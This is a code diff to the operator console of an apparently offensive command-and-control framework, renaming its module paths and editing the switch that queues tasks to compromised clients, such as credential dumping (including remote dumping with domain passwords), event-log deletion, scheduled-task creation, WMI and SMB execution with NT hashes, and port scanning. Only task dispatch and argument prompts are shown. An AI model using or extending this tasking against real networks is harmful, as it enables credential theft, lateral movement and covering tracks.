@@ -18,10 +18,10 @@ import (
 
 	"github.com/abiosoft/ishell/v2"
 	"github.com/gorilla/websocket"
-	"github.com/latortuga71/wsC2/internal/data"
-	"github.com/latortuga71/wsC2/internal/db"
-	"github.com/latortuga71/wsC2/internal/modules"
-	"github.com/latortuga71/wsC2/internal/utils"
+	"github.com/latortuga71/GoC2/internal/data"
+	"github.com/latortuga71/GoC2/internal/db"
+	"github.com/latortuga71/GoC2/internal/modules"
+	"github.com/latortuga71/GoC2/internal/utils"
 )
 
 var OperatorDone chan interface{}
@@ -541,10 +541,10 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 		PrepareTaskSimple(c, clientId, command)
 	case "dump-process":
 		PrepareTaskWithArgs(c, clientId, command, "<pid>;<dumpFilePath>")
-	case "dump-hashes":
+	case "dump-secrets":
 		PrepareTaskSimple(c, clientId, command)
-	case "dump-lsa":
-		PrepareTaskSimple(c, clientId, command)
+	case "dump-secrets-remote":
+		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine>;<domain>;<username>;<password>")
 	case "enum-users":
 		PrepareTaskSimple(c, clientId, command)
 	case "enum-groups":
@@ -567,6 +567,8 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 		PrepareTaskSimple(c, clientId, command)
 	case "delete-event-log":
 		PrepareTaskWithArgs(c, clientId, command, "<eventLogName>: ")
+	case "scheduled-task":
+		PrepareTaskWithArgs(c, clientId, command, "<hostname>;<taskName>;<taskFrequency>;<taskStartTime>;<taskBinary>;")
 	case "create-scheduled-task":
 		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine>;<taskName>;<taskFrequency>;<taskStartTime>;<taskBinary>;")
 	case "execute-scheduled-task":
@@ -577,8 +579,6 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 		PrepareTaskWithOneArg(c, clientId, command, "<powershellCommandToRun>: ")
 	case "powershell-history":
 		PrepareTaskSimple(c, clientId, command)
-	case "port-scan":
-		PrepareTaskWithOneArg(c, clientId, command, "<ipOrHostname>: ")
 	case "wmi-exec":
 		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine>;<domain\\username>;<passwordOrNtHash>;<command>: ")
 	case "smb-exec":
@@ -591,6 +591,8 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine>;<serviceName>;<command>: ")
 	case "subnet-scan":
 		PrepareTaskWithOneArg(c, clientId, command, "<192.168.1.0>: ")
+	case "port-scan":
+		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine>;<port>: ")
 	case "shell-history":
 		PrepareTaskSimple(c, clientId, command)
 	case "go-up":
